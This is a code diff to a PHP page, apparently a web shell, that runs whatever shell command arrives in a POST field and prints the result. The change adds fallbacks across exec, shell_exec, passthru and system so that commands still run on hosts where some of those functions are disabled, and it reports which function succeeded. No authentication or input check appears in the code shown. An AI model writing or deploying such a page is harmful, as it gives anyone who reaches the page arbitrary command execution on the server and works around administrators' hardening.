@@ -67,14 +67,33 @@
         <textarea readonly="readonly" rows="25" style="width: 80%;">
 <?php
     if($execute) {
-        passthru($_POST["cmd"], $exit_code);
+        if(function_exists("exec")) {
+            $exec_func = "exec";
+            exec($_POST["cmd"], $output, $exit_code);
+            echo htmlspecialchars(implode("\n", $output));
+        } else if(function_exists("shell_exec")) {
+            $exec_func = "shell_exec";
+            echo htmlspecialchars(shell_exec($_POST["cmd"]));
+        } else if(function_exists("passthru")) {
+            $exec_func = "passthru";
+            passthru($_POST["cmd"], $exit_code);
+        } else if(function_exists("system")) {
+            $exec_func = "system";
+            system($_POST["cmd"], $exit_code);
+        } else {
+            echo "Error - All of the following execution functions have been disabled in PHP:\n";
+            echo "exec\nshell_exec\npassthru\nsystem\n";
+        }
     }
 ?>
         </textarea>
         <div style="margin: 3px auto;">
 <?php
+    if(isset($exec_func)) {
+        echo "Execution function: <code>" . $exec_func . "</code>";
+    }
     if(isset($exit_code)) {
-        echo "Exit code: <code>" . htmlspecialchars($exit_code) . "</code>\n";
+        echo " &bull; Exit code: <code>" . htmlspecialchars($exit_code) . "</code>\n";
     }
 ?>
         </div>
